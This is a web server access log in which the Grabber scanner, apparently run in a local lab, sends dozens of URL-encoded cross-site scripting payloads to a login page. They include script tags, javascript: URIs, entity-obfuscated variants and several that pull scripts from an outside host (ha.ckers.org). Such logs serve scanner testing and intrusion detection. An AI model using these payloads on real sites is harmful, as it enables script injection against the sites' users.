172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /?Login=%3CHTML%3E%3CBODY%3E+%3C%3Fxml%3Anamespace+prefix%3D%22t%22+ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%3E+%3C%3Fimport+namespace%3D%22t%22+implementation%3D%22%23default%23time2%22%3E+%3Ct%3Aset+attributeName%3D%22innerHTML%22+to%3D%22XSS%3CSCRIPT+DEFER%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E%22%3E+%3C%2FBODY%3E%3C%2FHTML%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:42 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:43 +0000] "GET /?Login=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3Burl%3Djavascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:43 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:43 +0000] "GET /?Login=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3Burl%3Djavascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:43 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:43 +0000] "GET /?Login=%3C+%253C+%26lt+%26lt%3B+%26LT+%26LT%3B+%26%2360+%26%23060+%26%230060+%26%2300060+%26%23000060+%26%230000060+%26%2360%3B+%26%23060%3B+%26%230060%3B+%26%2300060%3B+%26%23000060%3B+%26%230000060%3B+%26%23x3c+%26%23x03c+%26%23x003c+%26%23x0003c+%26%23x00003c+%26%23x000003c+%26%23x3c%3B+%26%23x03c%3B+%26%23x003c%3B+%26%23x0003c%3B+%26%23x00003c%3B+%26%23x000003c%3B+%26%23X3c+%26%23X03c+%26%23X003c+%26%23X0003c+%26%23X00003c+%26%23X000003c+%26%23X3c%3B+%26%23X03c%3B+%26%23X003c%3B+%26%23X0003c%3B+%26%23X00003c%3B+%26%23X000003c%3B+%26%23x3C+%26%23x03C+%26%23x003C+%26%23x0003C+%26%23x00003C+%26%23x000003C+%26%23x3C%3B+%26%23x03C%3B+%26%23x003C%3B+%26%23x0003C%3B+%26%23x00003C%3B+%26%23x000003C%3B+%26%23X3C+%26%23X03C+%26%23X003C+%26%23X0003C+%26%23X00003C+%26%23X000003C+%26%23X3C%3B+%26%23X03C%3B+%26%23X003C%3B+%26%23X0003C%3B+%26%23X00003C%3B+%26%23X000003C%3B+%5Cx3c+%5Cx3C+%5Cu003c+%5Cu003C HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:43 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:43 +0000] "GET /?Login=%3C+%253C+%26lt+%26lt%3B+%26LT+%26LT%3B+%26%2360+%26%23060+%26%230060+%26%2300060+%26%23000060+%26%230000060+%26%2360%3B+%26%23060%3B+%26%230060%3B+%26%2300060%3B+%26%23000060%3B+%26%230000060%3B+%26%23x3c+%26%23x03c+%26%23x003c+%26%23x0003c+%26%23x00003c+%26%23x000003c+%26%23x3c%3B+%26%23x03c%3B+%26%23x003c%3B+%26%23x0003c%3B+%26%23x00003c%3B+%26%23x000003c%3B+%26%23X3c+%26%23X03c+%26%23X003c+%26%23X0003c+%26%23X00003c+%26%23X000003c+%26%23X3c%3B+%26%23X03c%3B+%26%23X003c%3B+%26%23X0003c%3B+%26%23X00003c%3B+%26%23X000003c%3B+%26%23x3C+%26%23x03C+%26%23x003C+%26%23x0003C+%26%23x00003C+%26%23x000003C+%26%23x3C%3B+%26%23x03C%3B+%26%23x003C%3B+%26%23x0003C%3B+%26%23x00003C%3B+%26%23x000003C%3B+%26%23X3C+%26%23X03C+%26%23X003C+%26%23X0003C+%26%23X00003C+%26%23X000003C+%26%23X3C%3B+%26%23X03C%3B+%26%23X003C%3B+%26%23X0003C%3B+%26%23X00003C%3B+%26%23X000003C%3B+%5Cx3c+%5Cx3C+%5Cu003c+%5Cu003C HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:43 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:43 +0000] "GET /?Login=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3B+URL%3Dhttp%3A%2F%2F%3BURL%3Djavascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:43 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:43 +0000] "GET /?Login=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3B+URL%3Dhttp%3A%2F%2F%3BURL%3Djavascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:43 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:43 +0000] "GET /?Login=%3CBGSOUND+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:43 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:43 +0000] "GET /?Login=%3CBGSOUND+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:43 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:43 +0000] "GET /?Login=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%22 HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:43 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:43 +0000] "GET /?Login=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%22 HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:43 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:43 +0000] "GET /?Login=%3CXML+ID%3DI%3E%3CX%3E%3CC%3E%3C%21%5BCDATA%5B%3CIMG+SRC%3D%22javas%5D%5D%3E%3C%21%5BCDATA%5Bcript%3Aalert%28%27XSS%27%29%3B%22%3E%5D%5D%3E+%3C%2FC%3E%3C%2FX%3E%3C%2Fxml%3E%3CSPAN+DATASRC%3D%23I+DATAFLD%3DC+DATAFORMATAS%3DHTML%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:43 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:43 +0000] "GET /?Login=%3CXML+ID%3DI%3E%3CX%3E%3CC%3E%3C%21%5BCDATA%5B%3CIMG+SRC%3D%22javas%5D%5D%3E%3C%21%5BCDATA%5Bcript%3Aalert%28%27XSS%27%29%3B%22%3E%5D%5D%3E+%3C%2FC%3E%3C%2FX%3E%3C%2Fxml%3E%3CSPAN+DATASRC%3D%23I+DATAFLD%3DC+DATAFORMATAS%3DHTML%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:43 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:43 +0000] "GET /?Login=%3CA+HREF%3D%22h+tt+p%3A%2F%2F6%26%2309%3B6.000146.0x7.147%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:43 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:43 +0000] "GET /?Login=%3CA+HREF%3D%22h+tt+p%3A%2F%2F6%26%2309%3B6.000146.0x7.147%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:43 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:43 +0000] "GET /?Login=%3CIMG+SRC%3D%26%23x6A%26%23x61%26%23x76%26%23x61%26%23x73%26%23x63%26%23x72%26%23x69%26%23x70%26%23x74%26%23x3A%26%23x61%26%23x6C%26%23x65%26%23x72%26%23x74%26%23x28%26%23x27%26%23x58%26%23x53%26%23x53%26%23x27%26%23x29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:43 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:43 +0000] "GET /?Login=%3CIMG+SRC%3D%26%23x6A%26%23x61%26%23x76%26%23x61%26%23x73%26%23x63%26%23x72%26%23x69%26%23x70%26%23x74%26%23x3A%26%23x61%26%23x6C%26%23x65%26%23x72%26%23x74%26%23x28%26%23x27%26%23x58%26%23x53%26%23x53%26%23x27%26%23x29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:43 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /?Login=%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E%3D%26%7B%7D HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /?Login=%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E%3D%26%7B%7D HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /?Login=%3CSCRIPT%3Edocument.write%28%22%3CSCRI%22%29%3B%3C%2FSCRIPT%3EPT+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /?Login=%3CSCRIPT%3Edocument.write%28%22%3CSCRI%22%29%3B%3C%2FSCRIPT%3EPT+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /?Login=%3C%2FTITLE%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /?Login=%3C%2FTITLE%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /?Login=%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /?Login=%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /?Login=%3CA+HREF%3D%22%2F%2Fwww.google.com%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /?Login=%3CA+HREF%3D%22%2F%2Fwww.google.com%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /?Login=%3CSCRIPT+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.jpg%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /?Login=%3CSCRIPT+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.jpg%22%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /?Login=%3CINPUT+TYPE%3D%22IMAGE%22+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /?Login=%3CINPUT+TYPE%3D%22IMAGE%22+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /?Login=%3CIMG+SRC%3Djavascript%3Aalert%28%27XSS%27%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /?Login=%3CIMG+SRC%3Djavascript%3Aalert%28%27XSS%27%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /?Login=%3CBODY+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /?Login=%3CBODY+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /?Login=%3CXML+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxsstest.xml%22+ID%3DI%3E%3C%2FXML%3E+%3CSPAN+DATASRC%3D%23I+DATAFLD%3DC+DATAFORMATAS%3DHTML%3E%3C%2FSPAN%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /?Login=%3CXML+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxsstest.xml%22+ID%3DI%3E%3C%2FXML%3E+%3CSPAN+DATASRC%3D%23I+DATAFLD%3DC+DATAFORMATAS%3DHTML%3E%3C%2FSPAN%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /?Login=%3CIMG+SRC%3D%22jav%26%23x09%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /?Login=%3CIMG+SRC%3D%22jav%26%23x09%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /?Login=%3CIMG+SRC%3D%22jav%26%23x0A%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /?Login=%3CIMG+SRC%3D%22jav%26%23x0A%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /?Login=%3COBJECT+classid%3Dclsid%3Aae24fdae-03c6-11d1-8b76-0080c744f389%3E%3Cparam+name%3Durl+value%3Djavascript%3Aalert%28%27XSS%27%29%3E%3C%2FOBJECT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /?Login=%3COBJECT+classid%3Dclsid%3Aae24fdae-03c6-11d1-8b76-0080c744f389%3E%3Cparam+name%3Durl+value%3Djavascript%3Aalert%28%27XSS%27%29%3E%3C%2FOBJECT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /?Login=a%3D%22get%22%3B%26%2310%3Bb%3D%22URL%28%22%22%3B%26%2310%3Bc%3D%22javascript%3A%22%3B%26%2310%3Bd%3D%22alert%28%27XSS%27%29%3B%22%29%22%3B+eval%28a%2Bb%2Bc%2Bd%29%3B HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /?Login=a%3D%22get%22%3B%26%2310%3Bb%3D%22URL%28%22%22%3B%26%2310%3Bc%3D%22javascript%3A%22%3B%26%2310%3Bd%3D%22alert%28%27XSS%27%29%3B%22%29%22%3B+eval%28a%2Bb%2Bc%2Bd%29%3B HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:44 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /?Login=%3CHTML+xmlns%3Axss%3E+%3C%3Fimport+namespace%3D%22xss%22+implementation%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.htc%22%3E+%3Cxss%3Axss%3EXSS%3C%2Fxss%3Axss%3E+%3C%2FHTML%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:45 +0000] "GET /?Login=%3CHTML+xmlns%3Axss%3E+%3C%3Fimport+namespace%3D%22xss%22+implementation%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.htc%22%3E+%3Cxss%3Axss%3EXSS%3C%2Fxss%3Axss%3E+%3C%2FHTML%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
